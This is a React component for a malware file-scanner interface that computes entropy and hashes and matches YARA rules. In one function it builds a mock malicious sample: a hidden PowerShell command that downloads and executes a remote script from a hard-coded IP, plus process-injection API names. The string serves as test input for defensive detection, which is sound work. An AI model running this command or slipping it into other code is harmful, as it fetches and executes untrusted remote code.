import React, { useState } from 'react';
import { analyzeFile } from '../services/fileAnalyzer';
import { FileAnalysisResult } from '../types/threat';
import { ExplainableAI } from './ExplainableAI';
import { Cpu, Upload, FileCode, ShieldAlert, CheckCircle, Terminal, HardDrive } from 'lucide-react';

export const FileScanner: React.FC = () => {
  const [result, setResult] = useState<FileAnalysisResult | null>(null);
  const [isScanning, setIsScanning] = useState(false);

  const handleFileUpload = async (file: File) => {
    setIsScanning(true);
    try {
      const res = await analyzeFile(file);
      setResult(res);
    } catch (err) {
      console.error(err);
    } finally {
      setIsScanning(false);
    }
  };

  const handleCreateMockSample = (sampleType: 'malware_script' | 'clean_text') => {
    let mockContent = '';
    let mockName = '';

    if (sampleType === 'malware_script') {
      mockName = 'payload_downloader.ps1';
      mockContent = `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.4/beacon.ps1')"; VirtualAlloc; CreateRemoteThread`;
    } else {
      mockName = 'system_config.json';
      mockContent = `{\n  "appName": "AegisCyber",\n  "status": "healthy"\n}`;
    }

    const blob = new Blob([mockContent], { type: 'text/plain' });
    const mockFile = new File([blob], mockName, { type: 'text/plain' });
    handleFileUpload(mockFile);
  };

  return (
    <div className="space-y-6">
      {/* File Dropzone */}
      <div className="glass-panel-glow rounded-xl p-6 text-center">
        <div className="flex items-center justify-center space-x-2 mb-3">
          <Cpu className="w-5 h-5 text-cyan-400" />
          <h2 className="text-sm font-mono font-bold text-slate-100 uppercase tracking-wide">
            STATIC FILE PAYLOAD & YARA ENTROPY INSPECTOR
          </h2>
        </div>
        <p className="text-xs text-slate-400 font-mono mb-6 max-w-2xl mx-auto">
          Upload binary payloads, scripts, or documents to compute Shannon entropy, MD5 / SHA-256 cryptographic hashes, and evaluate against dynamic YARA signatures.
        </p>

        <div className="border-2 border-dashed border-cyan-500/30 hover:border-cyan-400 bg-slate-900/60 rounded-xl p-8 transition-all flex flex-col items-center justify-center cursor-pointer group">
          <Upload className="w-10 h-10 text-cyan-400 group-hover:scale-110 transition-transform mb-3" />
          <p className="text-xs font-mono text-cyan-300 font-semibold mb-1">
            Drag & Drop File Here or Click to Browse
          </p>
          <p className="text-[11px] font-mono text-slate-500">
            Supports .exe, .ps1, .vbs, .js, .pdf, .docx, .zip (Max 50MB)
          </p>
          <input
            type="file"
            onChange={(e) => e.target.files?.[0] && handleFileUpload(e.target.files[0])}
            className="absolute opacity-0 w-full h-full cursor-pointer"
          />
        </div>

        {/* Sample Load Buttons */}
        <div className="flex flex-wrap items-center justify-center gap-3 mt-4 pt-4 border-t border-slate-800 font-mono text-xs">
          <span className="text-slate-400">Or test with simulated payload files:</span>
          <button
            onClick={() => handleCreateMockSample('malware_script')}
            className="px-3 py-1.5 rounded bg-pink-950/80 text-pink-300 border border-pink-500/40 hover:bg-pink-900/80 transition-all"
          >
            Load PowerShell Downloader (Malicious)
          </button>
          <button
            onClick={() => handleCreateMockSample('clean_text')}
            className="px-3 py-1.5 rounded bg-slate-800 text-slate-300 border border-slate-700 hover:bg-slate-700 transition-all"
          >
            Load Clean JSON Config
          </button>
        </div>
      </div>

      {/* Analysis Results */}
      {result && (
        <div className="space-y-6">
          {/* Main Risk Card */}
          <div className={`rounded-xl p-6 border ${
            result.severity === 'CRITICAL' || result.severity === 'HIGH' ? 'glass-panel-danger' : 'glass-panel-glow'
          }`}>
            <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6 font-mono">
              <div className="space-y-3 flex-1">
                <div className="flex items-center space-x-3">
                  <span className={`px-3 py-1 text-xs font-bold rounded-full border ${
                    result.severity === 'CRITICAL' ? 'bg-pink-950 text-pink-300 border-pink-500' : 'bg-emerald-950 text-emerald-300 border-emerald-500'
                  }`}>
                    {result.severity} RISK FILE
                  </span>
                  <span className="text-slate-300 font-bold text-sm">{result.filename}</span>
                  <span className="text-slate-500 text-xs">({(result.sizeBytes / 1024).toFixed(1)} KB)</span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                  <div className="p-3 bg-slate-900/90 rounded border border-slate-800">
                    <span className="text-slate-400 text-[10px] block">SHA-256 Hash Signature:</span>
                    <code className="text-cyan-300 text-[11px] break-all">{result.sha256}</code>
                  </div>
                  <div className="p-3 bg-slate-900/90 rounded border border-slate-800">
                    <span className="text-slate-400 text-[10px] block">MD5 Hash:</span>
                    <code className="text-cyan-300 text-[11px]">{result.md5}</code>
                  </div>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 text-xs">
                  <div className="p-2.5 bg-slate-900/80 rounded border border-slate-800">
                    <span className="text-slate-400 text-[10px] block">Shannon Entropy:</span>
                    <span className={`font-bold ${result.entropy > 6.5 ? 'text-pink-400' : 'text-emerald-400'}`}>
                      {result.entropy} / 8.0
                    </span>
                  </div>
                  <div className="p-2.5 bg-slate-900/80 rounded border border-slate-800">
                    <span className="text-slate-400 text-[10px] block">YARA Rules Matched:</span>
                    <span className="font-bold text-pink-300">{result.yaraMatches.length} Rules</span>
                  </div>
                  <div className="p-2.5 bg-slate-900/80 rounded border border-slate-800">
                    <span className="text-slate-400 text-[10px] block">Detected Functions:</span>
                    <span className="font-bold text-amber-300">{result.suspiciousFunctions.length} Flags</span>
                  </div>
                </div>
              </div>

              {/* Score Badge */}
              <div className="flex flex-col items-center justify-center p-4 bg-slate-900/90 rounded-xl border border-slate-800 shrink-0 min-w-[170px]">
                <span className="text-xs text-slate-400 mb-1">Payload Risk Score</span>
                <div className={`text-4xl font-extrabold ${result.riskScore >= 50 ? 'text-pink-400 text-danger-glow' : 'text-emerald-400'}`}>
                  {result.riskScore}<span className="text-sm font-normal text-slate-500">/100</span>
                </div>
              </div>
            </div>
          </div>

          <ExplainableAI features={result.xaiFeatures} overallScore={result.riskScore} />
        </div>
      )}
    </div>
  );
};
